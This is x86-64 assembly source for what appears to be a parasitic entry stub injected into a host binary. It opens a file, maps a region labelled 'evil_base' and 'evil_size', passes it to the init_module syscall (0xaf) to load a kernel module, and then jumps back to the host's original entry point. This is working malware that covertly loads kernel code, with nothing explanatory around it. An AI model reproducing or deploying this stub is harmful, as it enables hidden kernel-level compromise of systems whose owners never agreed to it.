.intel_syntax noprefix

base:
    jmp entry

off:
    .space 8

evil_base:
    .space 8

evil_size:
    .space 8

zero:
    .asciz ""

entry:
    push rdi
    push rsi
    push rdx
    push r10
    push r8
    push r9

payload:
    mov rax, 2
    lea rdi, [rip + file]
    mov rsi, 0
    mov rdx, 0
    syscall
    cmp rax, 0
    jl return

    mov r8, rax
    mov rax, 9
    mov rdi, 0
    mov rsi, [rip + evil_size]
    mov rdx, 1
    mov r10, 2
    mov r9, [rip + evil_base]
    syscall
    cmp rax, -1
    je return

    mov rdi, rax
    mov rax, 0xaf
    mov rsi, [rip + evil_size]
    lea rdx, [rip + zero]
    syscall

return:
    mov rax, [rip + off]
    lea rcx, [rip + base]
    sub rcx, rax
    pop r9
    pop r8
    pop r10
    pop rdx
    pop rsi
    pop rdi
    jmp rcx


file:
